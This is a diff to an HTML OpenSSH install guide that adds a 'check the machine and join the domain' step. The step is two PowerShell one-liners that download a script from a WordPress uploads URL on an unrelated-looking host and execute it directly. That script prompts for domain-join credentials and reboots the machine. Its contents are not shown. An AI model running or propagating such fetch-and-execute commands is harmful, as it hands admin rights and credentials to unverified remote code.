@@ -53,6 +53,13 @@
   <section id="guided">
     <h2>Guided install</h2>
 
+    <h3>0. Check the machine, and join the domain if needed</h3>
+    <p>One command reports admin rights, domain state, DNS, the signed-in user and whether OpenSSH is there:</p>
+    <pre><code>&amp; ([scriptblock]::Create((irm https://wp-opsec.eagleeye-intelligence.com/wp-content/uploads/thessley-downloads/windows-office-client.ps1))) -Check</code></pre>
+    <p>If it is not joined yet, let the same script do it. It resolves the domain first, so a DNS problem is reported instead of a failed join:</p>
+    <pre><code>&amp; ([scriptblock]::Create((irm https://wp-opsec.eagleeye-intelligence.com/wp-content/uploads/thessley-downloads/windows-office-client.ps1))) -Domain lab.thessley.test</code></pre>
+    <p>It prompts for an account that may join, reboots, and prints what to run next.</p>
+
     <h3>1. Install OpenSSH Server</h3>
     <pre><code>Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Set-Service -Name sshd -StartupType Automatic
